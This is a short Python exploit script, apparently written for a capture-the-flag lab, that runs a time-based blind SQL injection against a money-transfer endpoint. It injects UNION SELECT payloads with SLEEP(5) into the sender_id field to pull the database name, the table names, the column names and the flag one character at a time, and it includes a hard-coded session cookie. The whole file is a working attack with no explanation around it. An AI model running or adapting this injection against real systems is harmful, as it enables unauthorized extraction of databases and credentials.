import requests
import time
# 1 UNION SELECT CASE WHEN SUBSTRING((SELECT database()),{index},1)= \"{c}\" THEN SLEEP(5) ELSE NULL END, NULL, NULL, NULL, NULL, NULL #
# 1 UNION SELECT CASE WHEN SUBSTRING((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = \"tonghop\"),{index},1)= \"{c}\" THEN SLEEP(5) ELSE NULL END, NULL, NULL, NULL, NULL, NULL #
# 1 UNION SELECT CASE WHEN SUBSTRING((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema = \"tonghop\" AND table_name=\"flag\"),{index},1)= \"{c}\" THEN SLEEP(5) ELSE NULL END, NULL, NULL, NULL, NULL, NULL #
# 1 UNION SELECT CASE WHEN SUBSTRING((SELECT flag FROM tonghop.flag),{index},1)= \"{c}\" THEN SLEEP(5) ELSE NULL END, NULL, NULL, NULL, NULL, NULL #
CHARSET = ' abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.{}-()/\|,:;"\'*!@#$%^&+=' # 
RESPONSE = ''

burp0_url = "https://koinbase-26b2120a7505ad.cyberjutsu-lab.tech:443/api/transaction.php?action=transfer_money"
burp0_cookies = {"PHPSESSID": "765d769522844fb544c6b110c2476707"}
burp0_headers = {"Sec-Ch-Ua": "", "Sec-Ch-Ua-Platform": "\"\"", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded", "Accept": "*/*", "Origin": "https://koinbase-26b2120a7505ad.cyberjutsu-lab.tech", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://koinbase-26b2120a7505ad.cyberjutsu-lab.tech/send_money.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
for index in range(1,100):
    for c in CHARSET:
        burp0_data = {"sender_id": f"1 UNION SELECT CASE WHEN SUBSTRING((SELECT flag FROM tonghop.flag),{index},1)= \"{c}\" THEN SLEEP(5) ELSE NULL END, NULL, NULL, NULL, NULL, NULL #", "receiver_id": "1", "amount": "1"}
        r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
        thoi_gian_phan_hoi = r.elapsed.total_seconds()
        print("Tui đang thử kí tự thứ ",index," nè: ", c, "-->", r.text, "(time:",thoi_gian_phan_hoi,")", end="\r")
        if thoi_gian_phan_hoi > 5:
            RESPONSE += c
            print("Tìm ra kí tự thứ ", index, "là ", c, "(RESPONSE:",RESPONSE,")")
            break
